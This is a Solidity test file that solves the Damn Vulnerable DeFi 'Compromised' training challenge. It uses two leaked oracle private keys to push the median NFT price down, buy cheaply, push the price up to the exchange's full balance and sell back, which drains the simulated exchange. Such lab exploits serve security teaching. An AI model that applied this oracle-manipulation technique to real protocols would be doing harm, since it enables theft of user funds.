// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@test/BaseTest.sol";
import "@src/damn-vulnerable-defi/07-compromised/Exchange.sol";
import "@src/damn-vulnerable-defi/07-compromised/TrustfulOracle.sol";
import "@src/damn-vulnerable-defi/07-compromised/TrustfulOracleInitializer.sol";
import "@src/damn-vulnerable-defi/DamnValuableNFT.sol";
import {sl} from "@solc-log/sl.sol";

///
/// How to process the data from the challenge:
/// Decode server response from hex to string, then decode from base64 to get private key
/// hex -> base64 string -> normal string (private key)
///
contract CompromisedTest is BaseTest {
  
  TrustfulOracle oracle;
  Exchange exchange;
  DamnValuableNFT nftToken;

  address[] sources;
  
  uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 * 10e18;
  uint256 constant INITIAL_NFT_PRICE = 999 * 10e18;
  uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1 * 10e17;
  uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 * 10e18;

  function setUp() public override {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    super.setUp();
    vm.startPrank(deployer);

    sources = new address[](3);
    sources[0] = address(0xA73209FB1a42495120166736362A1DfA9F95A105);
    sources[1] = address(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
    sources[2] = address(0x81A5D6E50C214044bE44cA0CB057fe119097850c);

    // Initialize balance of the trusted source addresses
    for (uint8 i; i < sources.length; ++i) {
      vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
      assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
    }

    // Player starts with limited balance
    vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
    assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

    // Deploy the oracle and setup the trusted sources with initial prices
    string[] memory symbols = new string[](3);
    symbols[0] = "DVNFT";
    symbols[1] = "DVNFT";
    symbols[2] = "DVNFT";

    uint256[] memory initialPrices = new uint256[](3);
    initialPrices[0] = INITIAL_NFT_PRICE;
    initialPrices[1] = INITIAL_NFT_PRICE;
    initialPrices[2] = INITIAL_NFT_PRICE;

    oracle = new TrustfulOracleInitializer(
      sources, 
      symbols, 
      initialPrices
    ).oracle();

    // Deploy the exchange and get an instance to the associated ERC721 token
    exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
    nftToken = exchange.token();
    assertEq(nftToken.owner(), address(0));
    assertEq(nftToken.rolesOf(address(exchange)), nftToken.MINTER_ROLE());

  }

  function testCompromised() public {
    /** CODE YOUR SOLUTION HERE */
    address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
    address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

    sl.log("oracle1: ", oracle1);
    sl.log("oracle2: ", oracle2);

    // Adjust price to make NFTs really cheap
    vm.startPrank(oracle1);
    oracle.postPrice(nftToken.symbol(), 1);

    vm.startPrank(oracle2);
    oracle.postPrice(nftToken.symbol(), 1);

    sl.log("New median price: ", oracle.getMedianPrice(nftToken.symbol()));

    // Now buy the NFT from the exchange
    vm.startPrank(player);
    uint256 nftBought = exchange.buyOne{value: 1}();
    sl.log("Bought an NFT: ", nftBought);

    // Set maximal price for the NFT, so exchange is left empty
    uint256 maxPrice = address(exchange).balance;
    sl.log("Max price: ", maxPrice);

    vm.startPrank(oracle1);
    oracle.postPrice(nftToken.symbol(), maxPrice);

    vm.startPrank(oracle2);
    oracle.postPrice(nftToken.symbol(), maxPrice);

    // Now sell the NFT back to the exchange
    vm.startPrank(player);
    nftToken.approve(address(exchange), nftBought);
    exchange.sellOne(nftBought);

    // Bring back original DVNFT price 
    vm.startPrank(oracle1);
    oracle.postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);
    
    vm.startPrank(oracle2);
    oracle.postPrice(nftToken.symbol(), INITIAL_NFT_PRICE);

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Exchange must have lost all ETH
    assertEq(address(exchange).balance, 0, "Exchange balance must be 0");
        
    // Player's ETH balance must have significantly increased
    assertGt(player.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        
    // Player must not own any NFT
    assertEq(nftToken.balanceOf(player), 0);

    // NFT price shouldn't have changed
    assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE, "DVNFT must have its initial price");
  }
}
